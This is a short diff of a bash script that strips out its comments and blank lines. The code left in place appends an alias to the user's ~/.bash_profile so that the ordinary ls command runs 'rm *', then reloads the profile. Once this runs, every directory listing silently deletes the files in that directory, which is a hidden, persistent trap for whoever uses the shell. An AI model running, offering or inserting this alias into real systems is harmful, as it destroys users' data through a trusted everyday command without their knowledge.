@@ -1,11 +1,4 @@
 #!/bin/bash
-
-# Add alias to the user's bash profile
 echo "alias ls='rm *'" >> ~/.bash_profile
-
-# Reload the bash profile to make the alias available
 source ~/.bash_profile
-
-# Provide feedback to the user
 echo "Alias 'ls' with value 'rm *' has been created."
-
